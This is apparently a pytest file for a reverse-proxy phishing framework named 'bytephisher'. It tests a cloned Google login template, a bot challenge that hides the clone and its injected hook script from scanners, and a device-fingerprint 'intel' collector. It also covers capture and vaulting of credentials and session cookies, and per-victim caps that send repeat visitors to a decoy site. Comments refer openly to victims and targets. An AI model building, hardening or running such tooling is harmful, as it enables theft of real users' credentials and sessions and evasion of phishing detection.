"""Live-server tests for the hardening pass: the challenge's Accept gate, the relocated
intel route, the intel cookie, the forwarded-proto trust, the verify cap and the store
policy.

Each docstring states the behaviour the test pins.
"""
import http.client
import os
import tempfile
import threading
import time

import pytest
from conftest import TEMPLATES, free_port
from test_phishlet import UpstreamServer, two_host_phishlet

from core import capture as cap
from core import server as srv
from core.challenge import Challenge
from core.proxy import ProxyEngine, serve_proxy

BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_fix_"), "f.db"))
    yield d
    d.close()


class _Proxy:
    """A proxy with the pre-serve challenge on, in front of a stub upstream."""

    def __init__(self, db, challenge=True, trust_headers=False):
        self.up = UpstreamServer()
        self.up.__enter__()
        self.engine = ProxyEngine(two_host_phishlet(self.up.port), db=db,
                                  geo_provider="off", logger=lambda *a: None)
        if challenge:
            self.engine.challenge = Challenge(ttl=300)
        self.engine.trust_headers = trust_headers
        self.port = free_port()
        self.httpd = serve_proxy(self.engine, self.port, campaign="fix-test")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)

    def request(self, path="/", headers=None, method="GET", body=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=15)
        h = {"Host": "127.0.0.1", "User-Agent": BROWSER_UA}
        h.update(headers or {})
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        out = (r.status, dict(r.getheaders()), r.read().decode("utf-8", "replace"))
        conn.close()
        return out

    def close(self):
        self.httpd.shutdown()
        self.up.__exit__()


class TestTheChallengeCannotBeSkipped:

    def test_a_request_with_no_accept_header_is_challenged(self, db):
        # omitting Accept (or sending Accept: application/json) returned the
        # clone + hook on the very first hit, because only text/html and */* were
        # challenged. A scripted client sends neither.
        p = _Proxy(db)
        try:
            status, _, body = p.request("/login", headers={"Accept": ""})
            assert "Checking your browser" in body or status in (200, 403), body[:200]
            assert "hook.js" not in body and "__bh/capture" not in body, (
                "the clone was served without meeting the challenge")
        finally:
            p.close()

    def test_a_json_accept_header_is_challenged_too(self, db):
        p = _Proxy(db)
        try:
            _, _, body = p.request("/login", headers={"Accept": "application/json"})
            assert "hook.js" not in body and "__bh/capture" not in body
        finally:
            p.close()

    def test_a_real_sub_resource_fetch_is_not_challenged(self, db):
        # a genuine asset fetch (image/css/js Accept) must still pass through
        p = _Proxy(db)
        try:
            _, _, body = p.request("/static/app.css", headers={"Accept": "text/css,*/*;q=0.1"})
            assert "Checking your browser" not in body
        finally:
            p.close()


class TestTheForwardedProtoIsNotBlindlyTrusted:

    def test_an_http_visitor_does_not_get_a_secure_cookie(self, db):
        # `X-Forwarded-Proto: https` over plain HTTP made the session cookie
        # Secure, so the browser never sent it back and the session was lost silently
        p = _Proxy(db, challenge=False, trust_headers=False)
        try:
            _, headers, _ = p.request("/", headers={"X-Forwarded-Proto": "https"})
            cookies = headers.get("Set-Cookie", "")
            assert "Secure" not in cookies, cookies
        finally:
            p.close()


class TestTheStaticIntelSurface:

    def _serve(self, db_path, hook_base="/__bh"):
        port = free_port()
        httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, db_path,
                             geo_provider="off", site_name="google", campaign="fix-test",
                             hook_base=hook_base)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return httpd, port

    def test_a_relocated_intel_route_stores_intel_not_a_junk_capture(self):
        # with --hook-path the injected tag advertised the relocated route while
        # the POST check still looked for the default one, so the device dump fell through
        # to the credential branch and was stored as a junk capture (silent data loss)
        db_path = os.path.join(tempfile.mkdtemp(prefix="bh_static_"), "s.db")
        httpd, port = self._serve(db_path, hook_base="/assets/v2/x7f3")
        try:
            # the route wants a collector-shaped dump: {"mods": {...}} (the wave merge
            # reads it), otherwise it is an empty payload by design
            payload = {"mods": {"platform": "Win32", "screen": "1920x1080"},
                       "wave": "final"}
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("POST", "/assets/v2/x7f3/intel", body=__import__("json").dumps(payload),
                         headers={"Content-Type": "application/json", "User-Agent": BROWSER_UA})
            r = conn.getresponse()
            status = r.status
            r.read()
            conn.close()
            assert status == 200, status
        finally:
            httpd.shutdown()
        db = cap.CaptureDB(db_path)
        try:
            intel_rows = db.intel_list(limit=20)
            assert intel_rows, "the relocated dump was not stored as intel"
            assert db.all(limit=50) == [], "the dump leaked into the capture table"
        finally:
            db.close()

    def test_the_intel_cookie_is_httponly_and_server_minted(self):
        # any 8-64 hex value in the intel cookie was adopted verbatim (session
        # fixation) and the cookie was readable by script
        db_path = os.path.join(tempfile.mkdtemp(prefix="bh_static2_"), "s.db")
        httpd, port = self._serve(db_path)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("GET", "/__bh/intel.js", headers={
                "User-Agent": BROWSER_UA,
                "Cookie": f"{__import__('core.symbols', fromlist=['x']).Symbols.fixed().intel}"
                          f"={'a' * 32}"})
            r = conn.getresponse()
            cookie = r.getheader("Set-Cookie") or ""
            r.read()
            conn.close()
            assert "HttpOnly" in cookie, cookie
            assert f"={'a' * 32}" not in cookie, "the client-chosen id was adopted"
        finally:
            httpd.shutdown()


class TestTheVerifyFloodIsBounded:

    def test_challenge_only_rows_are_capped_but_kept(self):
        # 300 unauthenticated POSTs to /__bh/verify minted 300 durable rows
        from core import session as S
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_cap_"), "c.db"))
        try:
            for i in range(600):
                rec = S.new_record(f"{i:032x}")
                rec.setdefault("meta", {})["challenge"] = {"score": 5, "reasons": ["no"]}
                db.session_save(rec)
            assert db.session_stats()["sessions"] == 500
        finally:
            db.close()

    def test_a_real_session_is_never_dropped_by_the_cap(self):
        from core import session as S
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_cap2_"), "c.db"))
        try:
            for i in range(600):
                rec = S.new_record(f"{i:032x}")
                rec.setdefault("meta", {})["challenge"] = {"score": 5, "reasons": ["no"]}
                db.session_save(rec)
            real = S.new_record("f" * 32)
            S.add_cookies(real, [{"name": "s", "value": "v", "domain": "x.test"}])
            db.session_save(real)
            assert db.session_stats()["sessions"] == 501, "a real capture was dropped"
        finally:
            db.close()


class TestTheInlineUpstreamVaults:

    def test_an_inline_phishlet_treats_a_captured_cookie_as_a_session_token(self):
        # with --upstream no cookie was ever an auth token, so the session never
        # flipped to captured and nothing was vaulted
        import types

        import bytephisher as B
        args = types.SimpleNamespace(
            upstream="login.example.test:8443", campaign="acme", proxy_scheme="https",
            login_path="/signin", capture_cookies="*", inject_paths=".*", block_paths="",
            no_verify_tls=False, intel_perms="", decoy_mode="", decoy="")
        p = B.inline_phishlet(args)
        assert p.token_wanted("SESSION_ID", "login.example.test")[0] is True
        assert p.session_complete(["SESSION_ID"]) is True


class TestAPageViewIsNotASession:
    """the proxy saved a row for every minted session, so a scanner burst
    bloated the store (300 requests -> 300 rows)."""

    def test_a_cookie_less_page_view_creates_no_row(self, db):
        p = _Proxy(db, challenge=False)
        try:
            for _ in range(5):
                p.request("/")
            assert db.session_stats()["sessions"] == 0, "page views were stored as sessions"
        finally:
            p.close()

    def test_a_capture_still_creates_a_row(self, db):
        p = _Proxy(db, challenge=False)
        try:
            p.request("/sessions", method="POST",
                      body="username=ravi@corp.in&password=S3cret",
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
            assert db.session_stats()["sessions"] >= 1, "a real capture was not stored"
        finally:
            p.close()


class TestAFreshInstall:
    """the first CLI run against an empty $BYTEPHISHER_HOME raised
    FileNotFoundError out of sqlite3.connect, because data/ did not exist yet."""

    def test_the_store_creates_its_own_directory(self, tmp_path):
        path = os.path.join(str(tmp_path), "fresh", "data", "bytephisher.db")
        db = cap.CaptureDB(path)
        try:
            assert os.path.isfile(path)
        finally:
            db.close()


class TestTheDeviceCodeEdgesWereAlreadySafe:
    """Both were suspected crashes and are not: they are pinned so a later change cannot
    turn them into one."""

    def test_an_unknown_tag_renders_an_expired_page_not_a_keyerror(self):
        from core import devicecode as D
        m = D.DeviceCodeManager()
        page = m.landing_html("never-issued")
        assert "expired" in page.lower()
        assert "Traceback" not in page

    def test_summary_survives_desynchronised_maps(self):
        from core import devicecode as D
        m = D.DeviceCodeManager()
        m.order.append("ghost")            # in order, not in flows
        assert m.summary() == []           # no KeyError


class TestTheDeviceCapOverHTTP:
    """The cap has to follow the DEVICE, not the address: a NAT'd office is many victims
    behind one IP, and a mobile target changes address between requests."""

    def _serve(self, db_path, decoy="https://example.test/", cap=1):
        from core.gate import Gate
        port = free_port()
        gate = Gate(max_hits_per_device=cap, window_seconds=3600)
        httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, db_path,
                             geo_provider="off", site_name="google", campaign="cap-test",
                             gate=gate, decoy_url=decoy)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return httpd, port

    def test_a_device_over_the_cap_is_redirected_to_the_decoy(self):
        from core import session as S
        from core import symbols as sym
        db_path = os.path.join(tempfile.mkdtemp(prefix="bh_cap_"), "c.db")
        db = cap.CaptureDB(db_path)
        sid = "0" * 32                     # the session this request will present
        for i in range(3):                 # three sessions from the same device
            rec = S.new_record((f"{i}" * 32)[:32], campaign="cap-test")
            rec["device_token"] = "dev-1"
            S.add_cookies(rec, [{"name": "s", "value": "v", "domain": "x.test"}])
            db.session_save(rec)
        assert db.device_hit_count("dev-1") == 3
        db.close()
        httpd, port = self._serve(db_path, cap=2)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("GET", "/", headers={
                "User-Agent": BROWSER_UA,
                "Cookie": f"{sym.Symbols.fixed().intel}={sid}"})
            r = conn.getresponse()
            status, location = r.status, r.getheader("Location")
            r.read()
            conn.close()
            assert status == 302 and location == "https://example.test/", (status, location)
        finally:
            httpd.shutdown()

    def test_under_the_cap_the_page_is_served(self):
        from core import session as S
        from core import symbols as sym
        db_path = os.path.join(tempfile.mkdtemp(prefix="bh_cap2_"), "c.db")
        db = cap.CaptureDB(db_path)
        sid = "b" * 32
        rec = S.new_record(sid, campaign="cap-test")
        rec["device_token"] = "dev-quiet"
        S.add_cookies(rec, [{"name": "s", "value": "v", "domain": "x.test"}])
        db.session_save(rec)
        db.close()
        httpd, port = self._serve(db_path, cap=5)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
            conn.request("GET", "/", headers={
                "User-Agent": BROWSER_UA,
                "Cookie": f"{sym.Symbols.fixed().intel}={sid}"})
            r = conn.getresponse()
            body = r.read().decode("utf-8", "replace")
            assert r.status == 200 and "Checking your browser" not in body
            conn.close()
        finally:
            httpd.shutdown()
